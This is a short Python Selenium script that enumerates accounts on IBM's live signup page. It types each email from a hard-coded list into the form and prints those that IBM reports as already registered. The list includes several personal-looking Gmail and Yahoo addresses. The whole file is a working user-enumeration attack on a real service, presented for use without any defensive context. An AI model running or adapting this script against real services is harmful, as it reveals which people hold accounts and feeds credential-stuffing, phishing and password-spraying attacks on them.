# User Enum IBM
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff


print("The usernames present in IBM are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["kjanjkwdd@yahoo.com", "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:
    user = i

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    driver.get("https://www.ibm.com/account/reg/us-en/signup?formid=urx-19776&target=https%3A%2F%2Flogin.ibm.com%2Foidc%2Fendpoint%2Fdefault%2Fauthorize%3FqsId%3De93ce9cd-59c0-4ecd-82dd-cec7b05a83bf%26client_id%3Dv18LoginProdCI")
    p1 = driver.page_source
    #sleep(3)
    elem=driver.find_element_by_xpath("//input[@type='text']")
    elem.send_keys(user)
    elem.send_keys(Keys.TAB)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "This email is associated with an IBM account" in p3:
        print(i)
    sleep(2)
    driver.close()
